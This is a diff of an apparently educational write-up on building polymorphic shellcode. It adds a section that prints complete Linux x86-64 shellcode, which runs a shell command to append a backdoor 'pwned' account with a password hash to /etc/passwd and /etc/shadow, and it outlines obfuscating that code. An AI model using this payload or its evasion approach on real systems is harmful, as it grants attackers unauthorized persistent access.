@@ -230,7 +230,6 @@ With all those tricks, the final code has **98 bytes** size. **This is a reduced
 ```asm
 global _start
     section .text
-
 _start:
 
     jmp real_start
@@ -302,6 +301,66 @@ garbage_jump_3_loop:
 ```
 ### Sample 3:
 ---
+* Shellcode Name: shellcode name add_user_password
+* Author: Christophe G
+* URL: [http://shell-storm.org/shellcode/files/shellcode-879.php](http://shell-storm.org/shellcode/files/shellcode-879.php)
+* Description: Adds user "pwned" with "$pass$" password. Edits `/etc/passwd` and `/etc/shadow`
+* Original Shellcode Size: 273 bytes
+* Max Size of the polymorphic Version: 409 bytes
+* Size of the Created Polymorphic Version: 
+
+The original code defines a string that contains the commands to execute to add the user. For that it is using the JMP-CALL-POP technique to access and refer to thad string.
+
+The original code is:
+```asm
+global _start
+
+_start:
+        jmp short findaddress
+                                                                 
+_realstart:
+        pop rdi
+        xor byte [rdi + 7] , 0x41 ; replace A to null byte "/bin/shA"
+        xor byte [rdi + 10]  ,0x41 ; same "-cA"
+        xor rdx , rdx
+        lea rdi , [rdi]
+        lea r9 , [rdi + 8]
+        lea r10 , [rdi + 11]
+        push rdx
+        push r10
+        push r9
+        push rdi
+        mov rsi , rsp
+        add al , 59
+        syscall
+
+findaddress:
+        call _realstart
+        string : db "/bin/shA-cAecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ; echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: >> /etc/shadow"
+
+```
+To apply polymorphist, first thing that's going to be done is to store in the stack all those characters of the string to get rid of such long string that's using lot of bytes. Also, doing it, the code will be changed a lot and will save bytes what will let us to add more garbage instructions to be below the original shellcode size to obfuscate more the code.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
